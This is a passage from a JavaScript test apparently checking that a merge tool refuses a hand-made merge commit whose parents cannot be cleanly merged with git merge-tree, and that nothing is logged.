    const hand = T.g(['rev-parse', 'HEAD'], m);
    assert.equal(T.has(hand, 'new/b.txt') && !T.has(hand, 'old/b.txt'), true, 'the hand merge applied the directory rename');
    T.g(['push', '-q', '-f', 'origin', `${hand}:refs/heads/main`], m); T.g(['fetch', '-q', 'origin']);
    plantLanding(T.old, 'home', 'chore-hand', sha, hand, main1);
    const before = T.acts().length;
    const r = T.merge('hand', ['--approved', q]);
    refused(r, RECORDED_TREE(hand));
    assert.match(r.text, /git merge-tree of its parents failed or conflicts/);
    assert.equal(T.acts().length, before, 'nothing logged');
  } finally { T.done(); }
});
